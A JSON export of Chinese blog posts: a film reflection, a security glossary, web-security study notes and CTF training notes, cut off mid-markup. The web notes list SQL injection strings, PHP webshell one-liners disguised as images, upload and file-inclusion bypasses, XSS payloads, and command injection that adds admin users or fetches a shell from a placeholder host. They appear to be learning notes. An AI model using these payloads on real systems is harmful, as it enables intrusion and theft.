[{"title":"the normal heart","url":"http://ringfall.me/2017/08/27/the-normal-heart/","content":"<p>看完之后难过了好久，然后沉迷氰化物治愈x了好多天。。。<br>想起第一次知道艾滋病是小学的时候看儿童文学上有一篇文章，讲一个小村落里一个艾滋的孩子想要拥抱，具体内容已压在小学课本的厚厚时光里，只记得那时的心疼，只是一个拥抱却人人避之不及，何况大家都知道艾滋并不会通过简单的拥抱传染。<br>诚然影片中同性的各种行为的确略显疯狂与激进，然而当那些人名一个个被撕下收进橡皮筋，当孔雀一点点消瘦凋零，但我们束手无策，对他们的爱人更是无可言说的残忍，然而政府的无所作为，在女医生的衬托下，更显绝望难忍。<br>看完之后想说的很多，现在却打不出什么句子了。<br>可能也只有时间了吧，可以让深深的难过飘成远古的，薄薄的忧伤。<br>嗯。抗争不动的时候，累了的时候。悄悄和世界握手言和吧。<br>这世上无数像鲁迅一样的斗士，但却并不总是，可以拯救一个民族。<br>很喜欢谢耳朵在里面的设定，温柔而坚强。<br><br></p>\n","categories":["Blog"],"tags":["film"]},{"title":"vocable","url":"http://ringfall.me/2017/08/22/vocable/","content":"<p>一些名词的解释，有度娘又Google也有自己瞎几把猜的（不可轻信2333）</p>\n<h2 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h2><h3 id=\"cdn\"><a href=\"#cdn\" class=\"headerlink\" title=\"cdn\"></a>cdn</h3><p>可以加快速度哒内容分发网络，使用户可就近取得所需内容</p>\n<h3 id=\"waf\"><a href=\"#waf\" class=\"headerlink\" title=\"waf\"></a>waf</h3><p>WAF（在应用层）对来自Web应用程序客户端的各类请求进行内容检测和验证，对非法的请求予以实时阻断</p>\n<h3 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h3><p>中间件是位于平台（硬件和操作系统）和应用之间的通用服务（软件）。相连接的系统，即使它们具有不同的接口，但通过中间件相互之间仍能交换信息。</p>\n<h3 id=\"域名\"><a href=\"#域名\" class=\"headerlink\" title=\"域名\"></a>域名</h3><ul>\n<li>.com 顶级域名</li>\n<li>baidu.com 一级域名</li>\n<li>www.baidu.com 二级域名</li>\n<li>bbs.baidu.com 二级域名</li>\n<li>tieba.baidu.com 二级域名<h3 id=\"旁站\"><a href=\"#旁站\" class=\"headerlink\" title=\"旁站\"></a>旁站</h3>同IP的不同域名<h3 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h3>IP(xxx.xxx.xxx(C).xxx(D))的C段相同而D段不同的IP<h3 id=\"cms\"><a href=\"#cms\" class=\"headerlink\" title=\"cms\"></a>cms</h3>Content Management System内容管理系统，大概类似于网站模板</li>\n</ul>\n<h2 id=\"计算机\"><a href=\"#计算机\" class=\"headerlink\" title=\"计算机\"></a>计算机</h2><h3 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h3><p>shell是指用户与操作系统对话的一个接口，我们发出一个命令，通过shell告诉系统让系统执行我们的指令。</p>\n<h2 id=\"渗透\"><a href=\"#渗透\" class=\"headerlink\" title=\"渗透\"></a>渗透</h2><h3 id=\"Google-hacking\"><a href=\"#Google-hacking\" class=\"headerlink\" title=\"Google hacking\"></a>Google hacking</h3><p>各种姿势利用各种搜索引擎搜索信息通过特定语法来查找网站配置或代码中的安全漏洞</p>\n<h3 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h3><p>Proof of Concept中文意思是“观点证明”。这个短语并非仅仅在漏洞报告中使用，甲方在项目招标过程中也常常要求乙方提供POC，即证明你的方案或者产品能达到声称的功能或性能，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><p>Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p>\n<p><br><br></p>\n","categories":["Blog"],"tags":["搅屎棍之路"]},{"title":"暑假web整理","url":"http://ringfall.me/2017/08/22/web/","content":"<p>笔记整理+个人理解（很可能有不对。。。的意思QAQ）</p>\n<h2 id=\"网页流程\"><a href=\"#网页流程\" class=\"headerlink\" title=\"网页流程\"></a>网页流程</h2><p>（个人）在浏览器里输入网址 -&gt;<br>（网络/<a href=\"http://ringfall.me/2017/08/22/vocable/\">cdn</a>）浏览器查找域名的IP地址 -&gt;<br>浏览器给web服务器发送一个HTTP请求 -&gt; (安全狗<a href=\"http://ringfall.me/2017/08/22/vocable/\">WAF</a>) -&gt;<br>服务器“处理”请求(web服务器软件接收到HTTP请求，然后确定执行什么请求处理来处理它) -&gt;<br><a href=\"http://ringfall.me/2017/08/22/vocable/\">中间件</a> -&gt;<br>与数据库连接并执行数据库语句 -&gt;<br>服务器端执行php等代码并返回结果到html -&gt;<br>服务器生成并返回html响应 -&gt;<br>浏览器显示出HTML</p>\n<p>绕waf姿势列举</p>\n<ul>\n<li>木马免杀</li>\n<li>个人到网络时把流量转发到本地 base64_encode(),转发到网络 中转尝试突破防护</li>\n</ul>\n<h2 id=\"渗透流程\"><a href=\"#渗透流程\" class=\"headerlink\" title=\"渗透流程\"></a>渗透流程</h2><ul>\n<li>信息收集<ul>\n<li>域名、二级域名、旁站、C段</li>\n<li>社工（社工库）</li>\n<li>google hacking</li>\n<li>网站信息</li>\n<li>支付宝、朋友网、淘宝个人空间</li>\n</ul>\n</li>\n<li>尝试漏洞<ul>\n<li>端口的未授权访问</li>\n</ul>\n</li>\n<li>进入内网<ul>\n<li>域</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"常见漏洞\"><a href=\"#常见漏洞\" class=\"headerlink\" title=\"常见漏洞\"></a>常见漏洞</h2><ul>\n<li>弱口令（容易被别人猜测到或被破解工具破解的密码）-&gt; <a href=\"http://ringfall.me/2017/07/23/ah/\">暴力破解</a></li>\n<li>SQL注入（用户可以在输入数据处提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作）<ul>\n<li>规则<ul>\n<li>结构：数据库-表-字段-值</li>\n<li>数据库中双引号和单引号必须成双成对出现<br><code>select * from admin where id = &#39;1&#39;</code></li>\n<li>使用逻辑运算，判断语句是否正确<br><code>select * from admin where id = 1 and 1=1</code></li>\n<li>数学逻辑运算<br>and &amp;&amp; 与 真真为真<br>or || 或 真假为真<br>xor 异或 真假为真</li>\n<li>数据库连接运算符<br>SQL Server ‘a’+’b’=’ab’<br>MySQL ‘a’ ‘b’=’ab’<br>Oracle ‘a’||’b’=’ab</li>\n<li>注释符</li>\n</ul>\n</li>\n<li>分类<ul>\n<li>整形注入<br><code>select * from admin where id = 1</code></li>\n<li>字符串注入<br><code>select * from admin where id = &#39;1&#39;</code></li>\n<li>内联注入 <code>1&#39; and &#39;1&#39;=&#39;1</code></li>\n<li>终止注入 <code>1&#39; and 1=1#</code></li>\n<li>畸形解析 id=(((([(变量)]))))</li>\n</ul>\n</li>\n<li>具体方法<ul>\n<li>union查询（把两次或多次查询结果合并起来，列数必须一致）</li>\n<li>偏移注入（貌似是access的，<code>select * from admin as a inner join admin as b on a.id=b.id</code>就是说把admin表记为a，同时也记为b，然后查询条件是a表的id列与b表的id列相等，返回所有相等的行，显然，a,b都是同一个表，当然全部返回啦。inner join 等同于Where查询，然后有公式啥的。。暂时还没理解透）</li>\n<li>二次注入（服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。应该是更复杂的，需要理解源码的一种注入。。大概）</li>\n<li>宽字节注入（MySQL用GBK的编码时，\\’被转义成%5c%27，在前面加%df等就会解析成一个中文加单引号）</li>\n<li>伪静态注入（把查询的URL假装是静态页面，然而可以直接注入）</li>\n<li>报错注入（看报错里泄露的信息）</li>\n<li>盲注（瞎注x）</li>\n<li>布尔注入（通过判断语句的返回结果判断正误）</li>\n<li>时间注入（根据时间判断注入是否成功）</li>\n</ul>\n</li>\n<li>工具<ul>\n<li>啊D</li>\n<li>穿山甲</li>\n<li>Sqlmap</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>上传漏洞（由于服务端未作有效的验证处理，导致我们可以上传任意恶意脚本文件并执行恶意木马。）</p>\n<ul>\n<li>JavaScript验证（目测：网页不用加载流量）<ul>\n<li>删去onsubmit事件</li>\n<li>进about:config把javascript.enabled改成false</li>\n<li>禁用javascript</li>\n<li>先改后缀再用burp改回去</li>\n</ul>\n</li>\n<li>Mime验证<ul>\n<li>改content-type<ul>\n<li>image/jpeg</li>\n<li>image/gif</li>\n<li>image/png</li>\n<li>image/jpeg</li>\n<li>image/bmp</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>内容验证<ul>\n<li>copy把php放在jpg后（前加个空格）<br><code>copy /b mmm.png+mm.php mm2.png</code></li>\n<li>把php加进jpg属性中写在版权或啥里</li>\n</ul>\n</li>\n<li>扩展名验证<ul>\n<li>操作系统 window<ul>\n<li>php. </li>\n<li>php空格</li>\n<li>php::$data</li>\n</ul>\n</li>\n<li>文件流特性<ul>\n<li>大小写</li>\n</ul>\n</li>\n<li>中间件<ul>\n<li>IIS 6<ul>\n<li>asp、cer、cdx、asa都被解析为asp文件</li>\n<li>目录为1.asp则其他所有文件都解析为asp文件</li>\n<li>1.asp;1.jpg 1.asp;.jpg上传成功内容为空</li>\n<li>1.asp%001.jpg</li>\n</ul>\n</li>\n<li>IIS 7<ul>\n<li>fast-cgi漏洞</li>\n<li>上传图片马 1.jpg =&gt; 1.jpg/xxx.php</li>\n</ul>\n</li>\n<li>nginx<ul>\n<li>上传图片马 1.jpg =&gt; 1.jpg%00xxx.php</li>\n<li>上传图片马 1.jpg =&gt; 1.jpg/xxx.php</li>\n</ul>\n</li>\n<li>light<ul>\n<li>fast-cgi漏洞</li>\n<li>上传图片马 1.jpg =&gt; 1.jpg/xxx.php</li>\n</ul>\n</li>\n<li>apache<ul>\n<li>从右向左解析，如果最后的无法解析，则解析前一个</li>\n<li>php3 php4 phpml php5 pht （基于debian/ubuntu的apt-get安装lamp）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>代码层<ul>\n<li>判断文件头<code>&lt;?php</code> -&gt; <code>&lt;?php.....?&gt;</code></li>\n<li>（看php.ini）</li>\n<li><code>&lt;?php ... ?&gt;</code> 默认的php代码风格</li>\n<li><code>&lt;?.....?&gt;</code> short_open_tag=on php短标签风格</li>\n<li><code>&lt;%.....%&gt;</code> asp_tags=off asp风格</li>\n<li><code>&lt;script language=&quot;php&quot;&gt;.....&lt;/script&gt;</code> 脚本风格</li>\n<li>GIF89a <code>&lt;?php eval($_POST[&#39;a&#39;])?&gt;</code> 1.jpg</li>\n<li>GIF89a <code>&lt;? eval($_POST[&#39;a&#39;])?&gt;</code> 2.jpg</li>\n<li>GIF89a <code>&lt;% eval($_POST[&#39;a&#39;])%&gt;</code> 3.jpg</li>\n<li>GIF89a <code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code>  4.jpg </li>\n<li>GIF89a <code>&lt;% execute(request(1))%&gt;</code> 5.jpg</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>目录验证<br>   在A/b/c/是上传保存文件目录，存在一个脚本，判断c目录下是否存在php后缀的文件，如果存在，则删除。存在一个定义路径的变量和上传文件的变量</p>\n   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Content-Disposition: form-data; name=&quot;path&quot;</div><div class=\"line\"></div><div class=\"line\">../images</div><div class=\"line\">-----------------------------190023260920007</div><div class=\"line\">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.php&quot;</div><div class=\"line\">Content-Type: application/octet-stream</div><div class=\"line\"></div><div class=\"line\">&lt;?php</div><div class=\"line\">phpinfo();</div></pre></td></tr></table></figure>\n<p>   修改path，导致上传路径变到b目录下，不存在检测，则绕过验证</p>\n</li>\n<li>二次上传/双文件上传<br>在c是上传保存文件目录，代码存在bug，可以一次上传多个文件，但是检测的时候只检测第一个上传的文件，导致了使用双文件上传直接突破</li>\n<li>安全防护<ul>\n<li>代码层，使用白名单，上传类型限制</li>\n<li>将上传目录设置为无执行权限</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>文件包含漏洞（文件包含漏洞的产生原因是在通过函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。）<ul>\n<li>本机文件包含(Local File Inclusion，LFI)<ul>\n<li>通过文件包含漏洞，包含web服务器本机上的文件，从而获取服务器上的敏感信息或者直接拿下服务器。</li>\n<li>include $_GET[“file”].”tpl”;<ul>\n<li>%00截断 include.php?file=2.txt%00</li>\n<li>window下文件名最大长度259，unix为4099。后面用…..填充可忽略</li>\n</ul>\n</li>\n<li>include “test/“.$_GET[‘file’];<ul>\n<li>加../2.txt就好~</li>\n</ul>\n</li>\n<li>include “test_”.$_GET[‘file’];<ul>\n<li>加/../2.txt就好~</li>\n</ul>\n</li>\n<li>IIS 短标签 <ul>\n<li><code>&lt; === .</code> 一个任意字符</li>\n<li><code>&lt;&lt; === .*</code> 多个任意字符</li>\n<li><code>dchnjrhaufgfipHHAWKRGIORHA.txt === d&lt;&lt;</code></li>\n<li>如果首个字母相同，比较第二位的ascii，读取小的，以此类推</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>远程文件包含(Remote File Inclusion,RFI)<ul>\n<li>过http/https/ftp等协议，包含web服务器上的文件，从而获取服务器上的敏感信息或者直接拿下服务器。</li>\n<li>需要在php配置文件中开启allow_url_include=off（http or ftp or https）</li>\n<li>file=php://input就可(php伪协议 <code>?file=php://filter/convert.base64-encode/resource=xxx.php</code>)</li>\n</ul>\n</li>\n<li>安全防护<ul>\n<li>包含文件硬编码</li>\n<li>过滤../</li>\n<li>安装第三方安全软件</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>XSS攻击脚本攻击（应用程序对用户的输入过滤不足而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗。）<ul>\n<li>反射型</li>\n<li>存储型</li>\n<li><code>&lt;script&gt;alert()&lt;/script&gt;</code></li>\n<li><code>&lt;body onload=alert()&gt;</code></li>\n<li><code>&lt;input name=&quot;user&quot; value=&quot;变量&quot;&gt;</code><ul>\n<li>内联 1” onmouseover=”alert() <code>&lt;input name=&quot;user&quot; value=&quot;1&quot; onmouseover=&quot;alert()&quot;&gt;</code></li>\n<li>终止 1” onmouseover=alert()// <code>&lt;input name=&quot;user&quot; value=&quot;1&quot; onmouseover=alert()//&quot;&gt;</code></li>\n</ul>\n</li>\n<li>html<ul>\n<li><code>&lt;input name=&quot;user&quot; value=&quot;&quot;&gt;&lt;svg/onload=alert()&gt;&quot;&gt;</code></li>\n<li><code>&quot;&gt;&lt;svg/onload=alert()&gt;</code></li>\n</ul>\n</li>\n<li>安全防护<ul>\n<li>输出进行编码</li>\n<li>白名单和黑名单结合</li>\n<li>安装第三方安全软件</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>目录遍历（访问控制列表是用于授权过程的，它是一个Web服务器的管理员用来说明什么用户或用户组能够在服务器上访问、修改和执行某些文件的列表，同时也包含了其他的一些访问权限内容。主要是由于中间件的配置不当，导致了目录遍历。）<ul>\n<li>安全防护<ul>\n<li>IIS中关闭目录浏览</li>\n<li>Apache的httpd.conf文件中”Options Indexes FollowSymLinks”修改为”Options FollowSymLinks”</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>任意文件操作（web服务器由于对文件变量未进行有效的过滤防护，比如在下载文件时导致任意文件下载、在删除文件时导致任意文件删除等等。）<ul>\n<li>可用模糊测试</li>\n<li>安全防护<ul>\n<li>包含文件硬编码</li>\n<li>过滤../</li>\n<li>安装第三方安全软件</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>命令执行和逻辑漏洞（应用程序需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数，但是不合理的调用函数未考虑到安全因素，就会被利用执行恶意行为。）<ul>\n<li>命令执行<ul>\n<li>ping 变量</li>\n<li>ping 127.0.0.1 | echo “aa”</li>\n<li>ping 127.0.0.1 | net user c4 c4 /ad</li>\n<li>ping 127.0.0.1 &amp; net user</li>\n<li>ping 127.0.0.1 &amp;&amp; net user</li>\n</ul>\n</li>\n<li>绕过手法<ul>\n<li>管道符：window:| &amp; &amp;&amp; unix:| &amp; &amp;&amp; ;</li>\n<li>中间件是system/root 服务器提权<br>ping 变量 | net user c4 c4 /ad</li>\n<li>中间件是user web提权(webshell)<br>ping 变量 | echo “&lt;?php eval($_POST[1])?&gt;” 1.php<br>ping 变量 | wget <a href=\"http://xxx.com/1.php\" target=\"_blank\" rel=\"external\">http://xxx.com/1.php</a> 远程下载 wget curl</li>\n<li>window：<br>ping 变量 | dir 列目录<br>ping 变量 | type conn.php 读取数据库配置文件</li>\n<li>linux：<br>ping 变量 | ls 列目录<br>ping 变量 | cat conn.php 读取数据库配置文件</li>\n<li>注释<br>空格的替换 关注 09 0A 0C 0D A0 20 (16进制)<br><code>/*!...*/</code></li>\n</ul>\n</li>\n<li>逻辑错误漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误。<ul>\n<li>平行越权 权限类型不变，id改变</li>\n<li>垂直越权 id不变，权限类型改变</li>\n<li>交叉越权 </li>\n</ul>\n</li>\n<li>安全防护<ul>\n<li>尽量不使用外部调用</li>\n<li>使用时，过滤&amp;&amp;、&amp;、||、|、；五个字符</li>\n<li>采取多重认证</li>\n<li>对敏感数据存在的接口和页面做cookie，ssid，token验证</li>\n<li>cookie数据加密应严格使用标准加密算法</li>\n<li>权限最小化</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><br><br></p>\n","categories":["Blog"],"tags":["搅屎棍之路"]},{"title":"xman笔记","url":"http://ringfall.me/2017/08/02/xman/","content":"<h2 id=\"0x00-･ω･｀\"><a href=\"#0x00-･ω･｀\" class=\"headerlink\" title=\"0x00 |･ω･｀)\"></a>0x00 |･ω･｀)</h2><h3 id=\"枣起\"><a href=\"#枣起\" class=\"headerlink\" title=\"枣起\"></a>枣起</h3><p>前一天和妹子们修仙聊人生聊到夜半，全程瑟瑟发抖ORZ，膜小姐姐们，抱腿prprpr</p>\n<h3 id=\"Team-Building\"><a href=\"#Team-Building\" class=\"headerlink\" title=\"Team Building\"></a>Team Building</h3><p>可以光明正大地投靠大佬惹~萌新继续瑟瑟发抖ing<br>然后一整个队都始终在暗中观察2333(橘喵微笑脸<br>而且！在队里活捉一只大角虫欸~~~<br>数独最后几个空发现血崩的时候大家都慈祥地微笑(bu</p>\n<h3 id=\"诸葛大大哒讲话\"><a href=\"#诸葛大大哒讲话\" class=\"headerlink\" title=\"诸葛大大哒讲话\"></a>诸葛大大哒讲话</h3><p>%%%%%%%%%%%%%%%%%%%%%%%%%%%%先膜为敬<br>对ctf有了更多的了解啦~<br>也有了更深的执念和动力吧~<br>hacker就是超~帅嘛</p>\n<h3 id=\"白掌门哒谆谆教诲\"><a href=\"#白掌门哒谆谆教诲\" class=\"headerlink\" title=\"白掌门哒谆谆教诲\"></a>白掌门哒谆谆教诲</h3><p>虽然一直觉得hacker就应该是无拘无束的吖，不过还是要守法吧，毕竟窝们哒种花家它也是很努力的呢~<br>–从来就没有什么岁月静好，只是有人替我们负重前行。–<br>虽然所有所有的机制啊都还远不够完美，但我们的安全总是有祖国在保护着的啊，表白一发窝大天朝2333</p>\n<h3 id=\"晚安安\"><a href=\"#晚安安\" class=\"headerlink\" title=\"晚安安\"></a>晚安安</h3><p>码字和撸代码都是异曲同工，夜越深越爽吖~WA~</p>\n<h2 id=\"0x01-密码\"><a href=\"#0x01-密码\" class=\"headerlink\" title=\"0x01 密码\"></a>0x01 密码</h2><p>《线上幽灵》</p>\n<h3 id=\"基础姿势\"><a href=\"#基础姿势\" class=\"headerlink\" title=\"基础姿势\"></a>基础姿势</h3><p>Alice-Bob 第三方Oscar<br>明文P 密文C 秘钥K<br>对称密码体制：加密解密法则一样，一个秘钥<br>穷举/统计分析/数学分析攻击<br>唯密文/已知明文/选择明文/选择密文攻击<br>计算/可证明/无条件安全性</p>\n<h3 id=\"古典密码\"><a href=\"#古典密码\" class=\"headerlink\" title=\"古典密码\"></a>古典密码</h3><h4 id=\"单表代换加密\"><a href=\"#单表代换加密\" class=\"headerlink\" title=\"单表代换加密\"></a>单表代换加密</h4><p>暴力破解 词频分析（e和t最多）<br>欧拉定理：对任意互素的a和n，有：a^φ(n) ≡ 1 (mod n)<br>mod 26<br>移位密码-&gt;恺撒密码 仿射密码 埃特巴什码</p>\n<h4 id=\"多表代换加密\"><a href=\"#多表代换加密\" class=\"headerlink\" title=\"多表代换加密\"></a>多表代换加密</h4><p>playfair polybius/棋盘密码 nihilist hill（希尔密码）<br>维吉尼亚密码 kasiski测试法/重合指标法<br>autokey cipher（自动秘钥密码）</p>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4><p>培根密码 莫尔斯电码 栅栏密码 曲路密码 列移位密码 猪圈密码 键盘密码 手机/电脑键盘密码 QWE密码（QWE=ABC）</p>\n<h3 id=\"现代密码\"><a href=\"#现代密码\" class=\"headerlink\" title=\"现代密码\"></a>现代密码</h3><p>对称算法包括序列算法（流密码）和分组算法<br>混乱、扩散<br>DES 好复杂QAQ 轮秘钥+S盒置换+P盒置换<br>AES 比较安全<br>RC5<br>……<br>非对称算法<br>陷门单向函数<br>RSA<br>p,q选取不当:|p-q|大<br>共模攻击<br>小公钥指数攻击<br>零知识证明 完备性 可靠性 零知识 -&gt; fait-shamir协议</p>\n<h3 id=\"哈希函数\"><a href=\"#哈希函数\" class=\"headerlink\" title=\"哈希函数\"></a>哈希函数</h3><p>md5（32或16位） 填充-初始化变量-处理分组数据…<br>sha1</p>\n<h3 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h3><p>ASCII base64/32/16 shellcode quoted-printable XXencode UUencode url unicode utf-8 敲击码</p>\n<h3 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p><a href=\"http://quipqiup.com/\" target=\"_blank\" rel=\"external\">http://quipqiup.com/</a><br><a href=\"http://www.dmd5.com/\" target=\"_blank\" rel=\"external\">http://www.dmd5.com/</a><br><a href=\"http://www.cryptool-online.org/\" target=\"_blank\" rel=\"external\">http://www.cryptool-online.org/</a><br><a href=\"http://rumkin.com/tools/cipher/\" target=\"_blank\" rel=\"external\">http://rumkin.com/tools/cipher/</a><br>yafu<br>万能解码工具 CAP</p>\n<h2 id=\"0x02-misc\"><a href=\"#0x02-misc\" class=\"headerlink\" title=\"0x02 misc\"></a>0x02 misc</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p>recon</p>\n<h3 id=\"encode\"><a href=\"#encode\" class=\"headerlink\" title=\"encode\"></a>encode</h3><p>曼彻斯特/差分曼彻斯特<br>二进制（空格tab/二维码/图片转化）注意分组<br>base64（隐写（对比解码后编码和原串）：=默认删除最后八位）<br>图形码<br>工具 JPK CTFCrack</p>\n<h3 id=\"取证-amp-隐写\"><a href=\"#取证-amp-隐写\" class=\"headerlink\" title=\"取证&amp;隐写\"></a>取证&amp;隐写</h3><p>file文件类型<br>strings查看可见字符串<br>binwalk,foremost分析提取文件<br>010 Editor模板功能<br>png文件格式（修改高度/数据块）<br>LSB隐写 RGB值<br>gif 时间 空间 文件头<br>音频 频谱 波形 隐写软件<br>zip 核心目录区伪加密 爆破 CRC32（文件小） 明文攻击<br>流量包 文件修复 协议分析 数据提取<br>wireshark pcapfix dshell tshark<br>总体把握 协议分级 端点统计<br>过滤筛选 过滤语法 host,protocol,contains,特征值<br>发现异常 特殊字符串 协议某字段<br>数据提取 字符串/文件提取<br><code>tshark -r *....pcap* -T fields -e *data*|...</code><br>内存镜像分析 volatility<br>ntfs数据流 </p>\n<h2 id=\"0x02-安卓\"><a href=\"#0x02-安卓\" class=\"headerlink\" title=\"0x02 安卓\"></a>0x02 安卓</h2><p>开发：签名<br>权限（root）<br>漏洞-&gt;利用<br>hook<br>反编译 加壳 混淆 </p>\n<h2 id=\"0x03-逆向\"><a href=\"#0x03-逆向\" class=\"headerlink\" title=\"0x03 逆向\"></a>0x03 逆向</h2><p>汇编基础<br>基本工具<br>编辑 010editor(可自己写模板) editplus<br>可执行文件查看 PE Mach0 ELF<br>格式转换 Shellcode Helper<br>反汇编 IDA<br>设置data、code 查看cross reference 查看string list<br>F5 设置type 设置calling convention<br>调试器<br>gdb winDBG<br>OD x64dbg IDA内置调试器<br>步进 步过 运行至指定位置<br>搭建IDA远程调试环境 linux<br>去除软件保护<br>定位验证代码 正面 信息输入输出处 字符串<br>一些神奇的东西 apkdb z3求解器 边信道攻击<br>找main函数 快速定位关键位置<br>应对MFC程序 使用xspy查看消息处理函数<br>手动加载signature<br>F5的各种用法<br>《加密与解密》 《IDA Pro权威指南》 《软件调试》<br>//全程舔PPT配图，或许这就是大佬吧</p>\n<h2 id=\"0x04-web\"><a href=\"#0x04-web\" class=\"headerlink\" title=\"0x04 web\"></a>0x04 web</h2><h3 id=\"套路\"><a href=\"#套路\" class=\"headerlink\" title=\"套路\"></a>套路</h3><p>用Python或Ruby快速编写exp<br>SQL语法细微区别<br>不同编程语言特性<br>不同web服务器特性<br>脑洞<br>Mysql栗子 ‘1abc’=’1ABC’ ‘123’=123 hex(‘root’)结果是字符串<br>Access栗子 </p>\n<ul>\n<li>查询数据-偏移注入/跨库查询（要用绝对路径）<br>判断注入点 order by判断字段长度 获取表名 联合查询</li>\n<li>读写数据 </li>\n<li>执行命令</li>\n<li>其他 不存在注释，用%00截断 不支持多行</li>\n</ul>\n<p>一、爆破，包括包括md5、爆破随机数、验证码识别等<br>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截<br>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\\0截断、iconv截断、<br>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小<br>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、<br>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<code>&lt;?php &lt;? &lt;% &lt;script language=php&gt;</code>、花式解析漏洞、<br>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换<br>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法<br>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱<br>十、社工，包括花式查社工库、微博、QQ签名、whois<br>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断<br>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等<br>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过<br>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）<br>十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包<br>脑洞汇总：</p>\n<ul>\n<li>源代码<ul>\n<li>robot.txt</li>\n<li>comment</li>\n<li>vim_swap_file</li>\n<li>.pyc</li>\n<li>.DS_Store</li>\n<li>.git</li>\n<li>.svn</li>\n<li>bak file</li>\n</ul>\n</li>\n<li>waf<ul>\n<li>字符替换空型waf</li>\n<li>特殊字符（串）拦截型waf</li>\n</ul>\n</li>\n<li>考啥<ul>\n<li>PHP弱类型</li>\n<li>（反）序列化</li>\n<li>XSS+CSRF+SSRF+CRLF</li>\n<li>SQLi+RCE+upload</li>\n<li>源码审计<br>-其他</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><p>反射型<br>存储型<br>Dom-XSS<br>bypass filter<br>跨域 同源策略/回旋镖/穿甲伤害 UXSS</p>\n<h3 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h3><p>html css flash</p>\n<h3 id=\"SQLi\"><a href=\"#SQLi\" class=\"headerlink\" title=\"SQLi\"></a>SQLi</h3><p>各种绕过。。</p>\n<h3 id=\"文件包含和文件上传\"><a href=\"#文件包含和文件上传\" class=\"headerlink\" title=\"文件包含和文件上传\"></a>文件包含和文件上传</h3><p>伪协议<br>各种校验<br>.htaccess文件<br>变量与函数 一切输入都是有害的 一切进入函数的变量都是有害的<br>参数传递<br>可控变量<br>敏感功能点<br>通读代码</p>\n<h3 id=\"变量覆盖\"><a href=\"#变量覆盖\" class=\"headerlink\" title=\"变量覆盖\"></a>变量覆盖</h3><p>危险函数</p>\n<h3 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h3><h2 id=\"0x05-SQLi\"><a href=\"#0x05-SQLi\" class=\"headerlink\" title=\"0x05 SQLi\"></a>0x05 SQLi</h2><h3 